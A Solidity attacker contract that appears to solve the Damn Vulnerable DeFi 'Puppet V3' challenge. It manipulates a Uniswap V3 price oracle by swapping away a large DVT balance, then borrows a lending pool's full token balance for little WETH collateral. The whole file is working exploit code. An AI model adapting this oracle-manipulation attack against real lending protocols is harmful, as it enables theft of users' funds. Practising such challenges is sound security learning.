// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import {IDamnValuableToken} from "./IDamnValuableToken.sol";
import {INonfungiblePositionManager} from "./INonfungiblePositionManager.sol";
import {IPuppetV3Pool} from "./IPuppetV3Pool.sol";
import {IWETH} from "./IWETH.sol";

contract PuppetV3PoolAttacker is Ownable2Step, IUniswapV3SwapCallback {
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO =
        1461446703485210103287273052203988822378723970342;

    IWETH private immutable i_weth;
    IDamnValuableToken private immutable i_dvt;
    IUniswapV3Pool private immutable i_uniPool;
    INonfungiblePositionManager private immutable i_uniPoolPositionManager;
    IPuppetV3Pool private immutable i_puppetPool;

    error CallerIsNotUniswapV3Pool();
    error SwapAmount0BelowMinAmountOut(int256 minAmount0Out, int256 amount0Out);

    constructor(
        address _weth,
        address _dvt,
        address _uniPool,
        address _uniPoolPositionManager,
        address _puppetPool,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) payable Ownable2Step() {
        // 1. Store all the interfaces to be used during the attack. Few addresses (e.g. WETH, DVT) could be
        // obtained reading from contract storages (e.g. i_uniPool).
        i_weth = IWETH(payable(_weth));
        i_dvt = IDamnValuableToken(_dvt);
        i_uniPool = IUniswapV3Pool(_uniPool);
        i_uniPoolPositionManager = INonfungiblePositionManager(
            _uniPoolPositionManager
        );
        i_puppetPool = IPuppetV3Pool(_puppetPool);

        // 2. Transfer all DVTs from player (deployer) to this contract
        i_dvt.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            _v,
            _r,
            _s
        );
        uint256 senderDvtBalance = i_dvt.balanceOf(msg.sender);
        i_dvt.transferFrom(msg.sender, address(this), senderDvtBalance);

        // 3. Mint WETH
        i_weth.deposit{value: msg.value}();
    }

    receive() external payable {}

    function exploitBorrow() external onlyOwner {
        // 7. Calculate how many WETH are required to borrow all the DVTs from the lending pool
        uint256 puppetPoolDvtBalance = i_dvt.balanceOf(address(i_puppetPool));
        uint256 requiredWeth = i_puppetPool.calculateDepositOfWETHRequired(
            puppetPoolDvtBalance
        );
        // 8. Borrow them all
        i_weth.approve(address(i_puppetPool), requiredWeth);
        i_puppetPool.borrow(i_dvt.balanceOf(address(i_puppetPool)));
        // 9. Transfer them to the player in terms of passing the test
        i_dvt.transfer(owner(), i_dvt.balanceOf(address(this)));
    }

    function exploitSwap(uint256 _minAmountOut) external onlyOwner {
        // 4. Swap as much DVTs as possible for WETHs. This step requires this contract to be
        // `IUniswapV3SwapCallback`
        uint256 dvtBalance = i_dvt.balanceOf(address(this));
        i_dvt.approve(address(i_uniPool), dvtBalance);
        i_uniPool.swap(
            address(this),
            false, // NB: token1 (DVT) to token0 (WETH)
            int256(dvtBalance),
            MAX_SQRT_RATIO - 1, // NB: wildcard
            abi.encode(int256(_minAmountOut)) // NB: allows to check (in the swap callback) that the incoming amount of
            // WETH is OK
        );
    }

    function uniswapV3SwapCallback(
        int256 _amount0Delta,
        int256 _amount1Delta, // NB: amount of token1 that must
        bytes calldata _data
    ) external {
        // 5. Make sure this contract gets at least a `minAmountOut` of WETH after the swap
        int256 minAmountOut = abi.decode(_data, (int256));
        if (_amount0Delta > -minAmountOut) {
            revert SwapAmount0BelowMinAmountOut(_amount0Delta, minAmountOut);
        }
        // 6. Transfer as many DVTs as needed (`_amount1Delta`) to the Uniswap V3 pool
        i_dvt.transfer(msg.sender, uint256(_amount1Delta));
    }
}
